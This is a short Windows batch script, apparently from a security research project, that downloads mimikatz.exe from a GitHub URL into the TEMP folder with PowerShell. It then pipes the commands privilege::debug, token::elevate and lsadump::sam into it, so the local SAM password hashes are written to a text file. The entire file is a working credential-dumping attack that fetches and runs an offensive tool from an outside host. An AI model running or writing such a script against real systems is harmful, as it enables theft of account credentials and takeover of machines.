@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Paths and URL
set "TempPath=%TEMP%"
set "ExePath=%TempPath%\mimikatz.exe"
set "OutPath=%TempPath%\mimi_output.txt"
set "Url=https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/mimikatz.exe"

REM Download if missing
if not exist "%ExePath%" (
    powershell -Command "Invoke-WebRequest -Uri '%Url%' -OutFile '%ExePath%' -UseBasicParsing"
)


(
    echo --- STDOUT / STDERR ---
    
    REM Send commands to aaa.exe
    (
        echo privilege::debug
        echo token::elevate
        echo lsadump::sam
        echo exit
    ) | "%ExePath%"

    echo.
) >> "%OutPath%"

endlocal
